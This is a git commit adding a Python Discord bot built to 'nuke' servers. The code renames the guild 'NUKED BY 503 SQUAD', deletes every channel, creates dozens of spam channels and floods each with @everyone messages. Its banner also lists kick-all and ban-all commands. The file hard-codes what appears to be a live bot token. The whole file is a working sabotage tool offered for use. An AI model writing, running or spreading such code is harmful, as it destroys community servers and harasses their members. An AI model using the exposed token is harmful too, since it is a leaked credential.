28742dcdbcf201f15fec52e3a239538b8e6a1f19
Ethan Zaznap <76703277+Ethan-Zaznap@users.noreply.github.com>
2021-06-14 10:19:48 -0400

    Add files via upload

---
+++ main.py
@@ -0,0 +1,70 @@
+import discord
+from discord.ext import commands
+
+intents = discord.Intents.default()
+intents.members = True
+bot = commands.Bot(command_prefix='!', intents=intents)
+
+import colorama
+from colorama import Fore, Back, Style
+colorama.init()
+
+TOKEN = "ODQ3OTYyNjE4ODk0ODc2Njcy.YLFsug.xN3xvdmGlOL0USygynXfXCoG0WI"
+
+ServerName = "NUKED BY 503 SQUAD"
+ChannelName = "idfk"
+Message = "idk @everyone"
+
+@bot.event
+async def on_ready():
+    print(f'''
+    
+{Fore.RED} ██▓ ███▄    █   ██████  ▄▄▄       ███▄    █  ██▓▄▄▄█████▓▓██   ██▓
+{Fore.RED}▓██▒ ██ ▀█   █ ▒██    ▒ ▒████▄     ██ ▀█   █ ▓██▒▓  ██▒ ▓▒ ▒██  ██▒
+{Fore.RED}▒██▒▓██  ▀█ ██▒░ ▓██▄   ▒██  ▀█▄  ▓██  ▀█ ██▒▒██▒▒ ▓██░ ▒░  ▒██ ██░
+{Fore.RED}░██░▓██▒  ▐▌██▒  ▒   ██▒░██▄▄▄▄██ ▓██▒  ▐▌██▒░██░░ ▓██▓ ░   ░ ▐██▓░
+{Fore.RED}░██░▒██░   ▓██░▒██████▒▒ ▓█   ▓██▒▒██░   ▓██░░██░  ▒██▒ ░   ░ ██▒▓░
+{Fore.RED}░▓  ░ ▒░   ▒ ▒ ▒ ▒▓▒ ▒ ░ ▒▒   ▓▒█░░ ▒░   ▒ ▒ ░▓    ▒ ░░      ██▒▒▒ 
+{Fore.RED}▒ ░░ ░░   ░ ▒░░ ░▒  ░ ░  ▒   ▒▒ ░░ ░░   ░ ▒░ ▒ ░    ░     ▓██ ░▒░ 
+{Fore.RED} ▒ ░   ░   ░ ░ ░  ░  ░    ░   ▒      ░   ░ ░  ▒ ░  ░       ▒ ▒ ░░  
+{Fore.RED} ░           ░       ░        ░  ░         ░  ░            ░ ░     
+{Fore.RED}░ ░      
+{Fore.RED}
+{Fore.RED}
+{Fore.RED}
+
+{Fore.LIGHTCYAN_EX} Client: {Fore.LIGHTCYAN_EX} {bot.user.name}
+{Fore.LIGHTCYAN_EX} Verison: {Fore.LIGHTCYAN_EX} Beta
+
+{Fore.RED} !N1 to nuke
+{Fore.RED} !K2 to kick everyone
+{Fore.RED} !B3 to ban everyone
+''')
+
+@bot.command()
+async def N1(ctx):
+
+    await ctx.guild.edit(name=f'{ServerName}') 
+    print("Server name changed")
+
+    for c in ctx.guild.channels:
+        await c.delete()
+        print("Deleted Channel",c)
+
+    guild = ctx.message.guild
+
+    n=0
+    while(n<=85):
+        await guild.create_text_channel(f'{ChannelName}')
+        n = n+1
+        print("Channel Created")
+
+    for c in ctx.guild.text_channels:
+             await c.send(f'{Message}') 
+             await c.send(f'{Message}')
+             await c.send(f'{Message}')
+             await c.send(f'{Message}')
+             await c.send(f'{Message}')
+
+
+bot.run(TOKEN)
